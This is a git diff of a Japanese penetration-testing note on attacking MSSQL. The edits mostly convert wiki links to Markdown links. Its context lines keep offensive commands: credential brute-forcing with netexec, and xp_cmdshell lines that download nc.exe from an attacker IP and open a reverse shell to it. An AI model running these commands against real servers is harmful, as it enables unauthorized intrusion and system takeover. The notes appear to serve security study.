@@ -1,5 +1,5 @@
 - 関連ノート
-	- [[80 or 443 - HTTP or HTTPS#SQLi]]
+	- [80 or 443 - HTTP or HTTPS](80%20or%20443%20-%20HTTP%20or%20HTTPS.md#SQLi)
 
 - 🔗参考リンク
 	- [MSSQL Injection Cheat sheet - pentestmonkey](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet)
@@ -36,7 +36,7 @@ sqlcmd [-S <TargetIP|domain>] -U <username> -P <pw> -l 30 -Q "<SQL_query>"
 - ローカルの場合は`-S`はつけない、もしくは `-S 127.0.0.1`とする
 
 >[!WARNING] 注意
->WinRM/リバースシェルなど非インタラクティブシェルのとき、Windows認証で他ユーザーとしてログオンしたいのであれば、[[Tunneling Through Deep Packet Inspection]]と組み合わせて、`impacket`でアクセスしないと失敗する → RDP/SSH接続であれば、`runas`で対象ユーザーとしてcmdを実行し、`sqlcmd -E`でWindows認証のログオン可能
+>WinRM/リバースシェルなど非インタラクティブシェルのとき、Windows認証で他ユーザーとしてログオンしたいのであれば、[Tunneling Through Deep Packet Inspection](../Stealth&Evasion/Port%20Redirection/Tunneling%20Through%20Deep%20Packet%20Inspection.md)と組み合わせて、`impacket`でアクセスしないと失敗する → RDP/SSH接続であれば、`runas`で対象ユーザーとしてcmdを実行し、`sqlcmd -E`でWindows認証のログオン可能
 
 ---
 ---
@@ -57,7 +57,7 @@ SELECT SYSTEM_USER;
 ```sql
 SELECT IS_SRVROLEMEMBER('sysadmin');
 ```
-- 出力が1 → [[#xm_cmdshellの利用手順]]
+- 出力が1 → [1433 - MSSQL](1433%20-%20MSSQL.md#xm_cmdshellの利用手順)
 
 パスワードハッシュの列挙
 ```sql
@@ -226,7 +226,7 @@ nmap -v -n --script="safe and ms-sql-*" --script-args="mssql.instance-port=[port
 ```
 
 クレデンシャルブルートフォース（アカウントロックの危険性有）
-	※ ドメインはNetBIOS名を使用：[[139,445 -NetBIOS, SMB#Nbtscan]]
+	※ ドメインはNetBIOS名を使用：[139,445 -NetBIOS, SMB](139,445%20-NetBIOS,%20SMB.md#Nbtscan)
 ```zsh
 # netexec
 netexec mssql -d <domain> -u <username_wordlist> -p <pw_wordlist> <TargetIP>
@@ -319,13 +319,13 @@ EXEC xp_cmdshell 'powershell iwr -Uri http://<AttackerIP>:<port>/nc.exe -OutFile
 ```sql
 EXEC xp_cmdshell 'c:\users\public\nc.exe -e cmd <AttacerIP> 443'
 ```
-（その他のペイロード：[[What is the shell#Base64化したPowerShellリバースシェルワンライナー]]）
+（その他のペイロード：[What is the shell](../Common/What%20is%20the%20shell.md#Base64化したPowerShellリバースシェルワンライナー)）
 
 ---
 
 ## 特権昇格（Post-Exploitation）
 
-MSSQLサービスを実行しているユーザーは通常 `SeImpersonatePrivilege` を持っているため、これで特権昇格が可能([[💥Windows Privilege Escalation#Token Impersonationによる権限昇格]])
+MSSQLサービスを実行しているユーザーは通常 `SeImpersonatePrivilege` を持っているため、これで特権昇格が可能([💥Windows Privilege Escalation](../🪟Windows/💥Windows%20Privilege%20Escalation.md#Token%20Impersonationによる権限昇格))
 ```sql
 -- 1. 権限確認 
 EXEC xp_cmdshell 'whoami /priv';
